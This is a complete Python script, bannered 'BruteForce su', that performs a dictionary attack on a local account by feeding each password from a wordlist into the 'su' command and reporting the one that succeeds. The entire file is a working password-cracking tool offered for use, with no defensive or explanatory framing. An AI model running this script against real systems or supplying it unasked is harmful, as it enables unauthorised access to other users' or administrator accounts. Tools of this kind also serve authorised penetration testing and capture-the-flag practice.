import os
import sys
import time
import subprocess

ESC_GREEN = "\033[1;32m"
ESC_BLUE = "\033[1;34m"
ESC_RESET = "\033[0m"

timeout = 1.0


def print_help(progname):
	print(
		f"Usage: {progname} user dictionary [timeout] ...\n"
		"You must specify both the username and the dictionary file.\n"
		"Optionally, you can specify a timeout in seconds (e.g., 0.1).\n"
	)
	sys.exit(1)


def print_banner():
	print(
		ESC_BLUE + "******************************\n"
		"*       BruteForce su        *\n"
		"******************************" + ESC_RESET
	)


def check_pass(password, user):
	try:
		cmd = subprocess.Popen(
			["su", user],
			stdin=subprocess.PIPE,
			stdout=subprocess.DEVNULL,
			stderr=subprocess.DEVNULL,
			text=True,
		)
		cmd.stdin.write(password + "\n")
		cmd.stdin.close()

		try:
			cmd.wait(timeout=timeout)
		except subprocess.TimeoutExpired:
			cmd.kill()
			return False

		return cmd.returncode == 0
	except Exception as e:
		print("Error:", e)
		return False


def brute_force(dictionary, user):
	try:
		with open(dictionary, "r") as file:
			for line in file:
				password = line.strip()
				print("Trying password:", password)
				if check_pass(password, user):
					print(
						f"{ESC_GREEN}Password found for user {user}: {password}{ESC_RESET}"
					)
					break
	except FileNotFoundError:
		print("Error opening file:", dictionary)
		sys.exit(1)


def main():
	global timeout
	if len(sys.argv) < 3:
		print_help(sys.argv[0])

	print_banner()

	user = sys.argv[1]
	dictionary = sys.argv[2]

	if len(sys.argv) >= 4:
		try:
			val = float(sys.argv[3])
			if val > 0:
				timeout = val
			else:
				print("Invalid timeout value. Using default: 1.0s")
		except ValueError:
			print("Invalid timeout value. Using default: 1.0s")

	brute_force(dictionary, user)


if __name__ == "__main__":
	main()
